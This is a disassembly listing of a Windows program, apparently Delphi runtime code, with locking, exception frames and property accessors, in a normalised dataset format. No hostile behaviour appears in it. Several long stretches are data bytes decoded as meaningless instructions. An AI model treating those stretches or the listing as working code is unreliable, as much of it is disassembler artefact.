mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410c34
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410bb4
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_410990
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4109f1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404f08
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4109f8
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403344
sub_410a40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410bb4
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410c34
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410a94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_410acc
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410bb4
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410b08
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4036d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_410b6b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b72
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_410c0c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4033f8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410c34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410cdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f08
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_410cec
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_410dc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410da5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f10
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410dac
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403294
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4042f8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407fcc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_410ddc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410e4b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e52
retn
call sub_410990
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050d0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404b1c
mov eax rw-data
call sub_404094
mov eax rw-data
call sub_40f25c
sub_410e54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410ef5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410efc
retn
mov eax rw-data
call sub_410960
mov eax sub_40ef5c
mov [ rw-data ] eax
mov eax sub_40eb84
mov [ rw-data ] eax
mov edx sub_40ea94
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f25c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_410654
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f570
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f89c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ffc4
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_410f00
inc esi
dec ecx
add [ ebp + 0x640000ff ] ch
inc esi
dec ecx
add [ esi + 0x640000ff ] ch
inc esi
dec ecx
add [ edi + 0x640000ff ] ch
inc esi
dec ecx
add [ eax + 0x640000ff ] dl
inc esi
dec ecx
add [ ecx + 0x640000ff ] dl
inc esi
dec ecx
add [ edx + 0x640000ff ] dl
inc esi
dec ecx
add [ ebx + 0x640000ff ] dl
inc esi
dec ecx
add [ edi + edi * 8 + 0x46640000 ] dl
dec ecx
add [ ebp + 0x640000ff ] dl
inc esi
dec ecx
add [ esi + 0x640000ff ] dl
inc esi
dec ecx
add [ edi + 0x640000ff ] dl
inc esi
dec ecx
add [ eax + 0x640000ff ] bl
inc esi
dec ecx
add [ ecx + 0x640000ff ] bl
inc esi
dec ecx
add [ edx + 0x640000ff ] bl
inc esi
dec ecx
add [ ebx + 0x640000ff ] bl
inc esi
dec ecx
add [ edi + edi * 8 + 0x46640000 ] bl
dec ecx
add [ ebp + 0x640000ff ] bl
inc esi
dec ecx
add [ esi + 0x640000ff ] bl
inc esi
dec ecx
add [ edi + 0x640000ff ] bl
inc esi
dec ecx
add [ eax + 0x640000ff ] al
inc esi
dec ecx
add [ ecx + 0x640000ff ] al
inc esi
dec ecx
add [ edx + 0x640000ff ] al
inc esi
dec ecx
add [ ebx + 0x640000ff ] al
inc esi
dec ecx
add [ edi + edi * 8 + 0x46640000 ] al
dec ecx
add [ ebp + 0x640000ff ] al
inc esi
dec ecx
add [ esi + 0x640000ff ] al
inc esi
dec ecx
add [ edi + 0x640000ff ] al
inc esi
dec ecx
add [ eax + 0x640000ff ] cl
inc esi
dec ecx
add [ ecx + 0x640000ff ] cl
inc esi
dec ecx
add [ edx + 0x640000ff ] cl
inc esi
dec ecx
add [ ebx + 0x640000ff ] cl
inc esi
dec ecx
add [ edi + edi * 8 + 0x46640000 ] cl
dec ecx
add [ ebp + 0x640000ff ] cl
inc esi
dec ecx
add [ esi + 0x640000ff ] cl
inc esi
dec ecx
add [ edi + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_41103d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411044
retn
sub_411088
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4110d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_41107c
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_40833c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_411088
mov edx [ rw-data ]
mov eax esi
call sub_407fcc
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407fcc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_40833c
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_411138
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4111a8
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_41121c
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_411278
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4112cc
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404330
mov ecx esp
mov edx esi
mov eax ebx
call sub_411278
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_411314
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_411300
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_411354
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41139c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4048c0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4113d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113a3
lea eax [ ebp - 0x4 ]
call sub_404774
retn
sub_4113ac
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_4112cc
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_411314
pop ebx
retn
dec bl
je r-xdata
call sub_411354
jmp r-xdata
pop ebx
retn
sub_4113d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41149e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_40431c
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4113ac
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4114a5
lea eax [ ebp - 0xc ]
call sub_404094
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4047b0
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4114ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_41107c
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_4114f4 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411623 ]
jmp [ eax * 4 + jump_table_411590 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4116b8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4116a4
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4116f8
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_411730
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_41176c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4057f8
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4117e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_411826
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41182d
retn
mov eax rw-data
call sub_404094
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404b1c
sub_411838
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41185d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411864
retn
sub_4121a3
inc ecx
add [ ebx - 0x6affbedf ] cl
and [ ecx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
mov eax [ 0x8004121 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x221c0040 ] cl
inc ecx
add [ ebp + 0x4121 ] ch
add [ eax ] al
add [ edx ] ch
inc ecx
add [ eax + 0x22 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
and al [ ecx ]
or al 0x0
add [ eax ] al
loopne r-xdata
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ ecx + ecx * 2 + 0x4be80041 ] dh
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] bh
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
inc ecx
add [ ebp + esi + 0x4b580040 ] cl
inc ecx
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
mov [ ecx + 0x41 ] cl
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ eax + 0x56 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x58746e65
and al [ ecx ]
pop es
adc eax 0x746e4954
jb r-xdata
jae r-xdata
inc ecx
add [ eax - 0xbffbeac ] ah
push esp
inc ecx
add [ eax + 0x38004155 ] ah
push edi
inc ecx
add [ eax + 0x24004157 ] dl
pop eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + 0xc0041 ] al
dec [ ebx + 0x412308c0 ]
add [ eax ] al
add bh bh
add [ eax - 0x57ffbedd ] cl
and eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ ebx + 0x4123ccc0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ eax ] al
add al dl
and al 0x41
add [ eax ] dh
add [ eax ] al
add [ edx + 0x358c0041 ] bh
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
cld
outsb
jae r-xdata
0x10004123 0x0
add al ah
and [ ecx ] al
imul esi [ ebx + 0x74 ] 0x1c746e65
and al [ ecx ]
push esp
and [ ecx ] eax
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add al cl
dec ebp
inc ecx
add [ esp + ebx * 2 + 0x5cd80041 ] ah
inc ecx
add ah bl
pop esp
inc ecx
add al ah
pop esp
inc ecx
add [ ecx + edx * 2 + 0x5e540041 ] dh
inc ecx
add [ eax - 0x7bffbea2 ] dh
pop edi
inc ecx
add [ eax + ebx * 2 + 0x41 ] dh
add al al
pop edi
inc ecx
add [ eax ] dh
inc ecx
add [ eax + 0x5a ] bl
inc ecx
add [ edx + ebx * 2 + 0x41 ] ah
add [ eax ] dl
dec ebp
inc ecx
add [ eax ] al
pop ebx
inc ecx
add [ eax + 0x5b ] al
inc ecx
add [ ebx + ebx * 2 + 0x51600041 ] ch
inc ecx
add [ ebx * 2 + 0x53680041 ] bh
inc ecx
add [ esp + edx * 2 ] bh
inc ecx
add [ eax + 0x5d ] bh
inc ecx
add [ eax - 0x5fffbea3 ] cl
push esp
inc ecx
add ah dh
push esp
inc ecx
add [ eax + 0x38004155 ] ah
push edi
inc ecx
add [ eax + 0x24004157 ] dl
pop eax
inc ecx
add al cl
pop edx
inc ecx
add ah ah
pop edx
inc ecx
add ah bl
pop ebp
inc ecx
add [ esp + ebx * 2 ] ch
inc ecx
add ah ch
pop edi
inc ecx
add ah bh
pop edi
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
ror [ esi + 0x41 ] 0x1
outsb
dec ecx
je r-xdata
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax + 0x60d00041 ] al
imul ebp [ esi + 0x67 ] 0x7473694c
loopne r-xdata
je r-xdata
test al 0x23
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
inc ecx
add [ esi + edx * 2 + 0x57ec0041 ] al
inc ecx
add [ eax + ebx * 2 + 0x41 ] dh
inc eax
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cwde
dec esp
inc ecx
add [ eax - 0x2fffbeb6 ] bl
dec esi
inc ecx
add al cl
dec ebp
inc ecx
add [ eax ] dh
sub eax [ eax ]
push esp
push ecx
inc ecx
add [ eax ] dh
sub eax [ eax ]
pop esp
push ecx
inc ecx
add [ ecx + edx * 2 + 0x56500041 ] dh
jae r-xdata
dec esi
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0x4010
add [ eax ] al
add [ ebp + 0x24380040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
je r-xdata
popad
inc eax
add [ eax + 0x25 ] dl
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
test [ edx ] ah
inc ecx
add [ eax + eax ] cl
add [ ecx + ebx * 2 ] dh
inc ecx
add [ ecx + ebx * 2 + 0x4cc80041 ] bh
inc ecx
add ah ch
dec esp
inc ecx
add [ eax ] dl
dec ebp
inc ecx
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
